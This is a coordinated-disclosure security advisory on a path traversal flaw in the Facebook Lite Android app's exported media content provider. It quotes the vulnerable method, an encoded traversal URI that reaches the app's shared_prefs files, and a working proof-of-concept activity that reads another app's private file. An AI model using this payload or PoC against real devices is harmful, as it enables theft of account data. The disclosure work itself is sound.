
# Vulnerability in Facebook Lite app for Android


## 1. Advisory Information

**Title:** Vulnerability in Facebook Lite app for Android

**Advisory ID:** STIC-2015-2012

**Advisory URL:** [http://www.fundacionsadosky.org.ar/publicaciones-2](http://www.fundacionsadosky.org.ar/publicaciones-2)

**Date published:** 2016-29-1

**Date of last update:** 2016-1-26

**Vendors contacted:** Facebook

**Release mode:** Coordinated release



## 2. Vulnerability Information

**Class:**  Improper Limitation of a Pathname to a Restricted Directory [[http://cwe.mitre.org/data/definitions/22.html](http://cwe.mitre.org/data/definitions/22.html)]

**Impact:** Data loss

**Remotely Exploitable:** No

**Locally Exploitable:** Yes

**CVE Identifier:** N/A



## 3. Vulnerability Description

Facebook Lite is a lighter Android version of the Facebook's social network app. The app is designed specifically for use in countries where the wireless networks are slow or to install on older devices that are not able to support all of the original Facebook version.

Facebook Lite has around 50 to 100 milli  ons downloads (as of January 2016). The app has a Path traversal vulnerability that allows other apps to access any files in the application's internal storage. This could allow a malicious application, without any required permissions, to take control of the victim device's Facebook account .


## 4. Vulnerable packages

* Facebook Lite version 1.15.0.137.302 or older

## 5. Vendor Information, Solutions and Workarounds

Facebook acknowledged and fixed the vulnerability in the app version 1.15.0.137.302, released on January 28, 2016.


## 6. Credits

This vulnerability was discovered and researched by Joaquín Manuel Rinaudo. The publication of this advisory was coordinated by Programa Seguridad en TIC. 

## 7. Technical Description

Facebook Lite application has an exported provider named MediaContentProvider. This provider is vulnerable to a Path Traversal vulnerability. While calling ContentProvider openFile method the app obtain the last path segment directly from the URI which is controlled by an attacker and can be pointed to an encoded relative path to any file. 

The following vulnerable method is from _com.facebook.lite.photo.MediaContentProvider_ class.

```
    public ParcelFileDescriptor openFile(Uri r5_Uri, String r6_String) {
        new StringBuilder("photo/called with uri: ").append(r5_Uri);
        if (this.a.match(r5_Uri) == 1) {
            File r0_File = new File(getContext().getFilesDir(), r5_Uri.getLastPathSegment());
            if (!r0_File.exists()) {
                try {
                    r0_File.createNewFile();
                } catch (IOException e) {
                    Log.e("MediaContentProvider", "photo/create new file failed", e);
                }
            }
            return ParcelFileDescriptor.open(r0_File, 805306368);
        } else {
            new StringBuilder("photo/unsupported uri: ").append(r5_Uri);
            throw new FileNotFoundException(new StringBuilder("Unsupported uri: ").append(r5_Uri.toString()).toString());
        }
    }


```


For example, when an attacker requests access to the URI _content://com.facebook.lite.media/..%2Fshared_prefs%2Frti.mqtt.ids.xml_, the last path segment would translate to _../shared_prefs/rti.mqtt.ids.xml_. This would allow that file, that is stored in the application internal storage, to be read by a malicious application. 


The provided POC shows how any application can read a Facebook Lite internal file:

```
  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    Uri uriCustom = Uri
        .parse("content://com.facebook.lite.media/..%2Fshared_prefs%2Frti.mqtt.ids.xml");
    InputStream fileStream;
    try {
      fileStream = getContentResolver().openInputStream(uriCustom);

      BufferedReader r = new BufferedReader(new InputStreamReader(
          fileStream));
      StringBuilder total = new StringBuilder();
      String line;
      while ((line = r.readLine()) != null) {
        total.append(line);
      }

      fileStream.close();
      Log.d("DEBUG", "string is " + total.toString());
    TextView text = (TextView)findViewById(R.id.file_content);
    text.setText(total);
    } catch (Exception e) {
      Log.d("DEBUG", Log.getStackTraceString(e));
    }
  }



```


## 8. Report Timeline

* **2015-11-20:** 
        Technical details of the vulnerabilities sent to the vendor.
        
* **2015-11-25:** 
        The vendor acknowledged to have received the report and sent it to the appropriate product team.
        
* **2015-12-3:**  asked for an status update on the issue.
        
* **2016-01-4:** 
        Having received no response,  asked for an estimated time of release for the fix.
        
* **2016-01-25:** 
        The vendor assured that a fix was ready and that they were working to get it deployed.
        
* **2016-01-26:** 
        The vendor notified that the app would be updated that week with the patch.
        
* **2016-29-1:** 
        Advisory was released. 

## 9. References



## 10. About Fundación Dr. Manuel Sadosky

The Dr. Manuel Sadosky Foundation is a mixed (public / private) institution whose goal is to promote stronger and closer interaction between industry and the scientific-technological system in all aspects related to Information and Communications Technology (ICT). The Foundation was formally created by a Presidential Decree in 2009. Its Chairman is the Minister of Science, Technology, and Productive Innovation of Argentina; and the Vice-chairmen are the chairmen of the country’s most important ICT chambers: The Software and Computer Services Chamber (CESSI) and the Argentine Computing and Telecommunications Chamber (CICOMRA). For more information visit: [http://www.fundacionsadosky.org.ar](http://www.fundacionsadosky.org.ar)

## 11. Copyright Notice

The contents of this advisory are copyright (c) 2014 Fundación Sadosky and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 4.0 License: [http://creativecommons.org/licenses/by-nc-sa/4.0/](http://creativecommons.org/licenses/by-nc-sa/4.0/)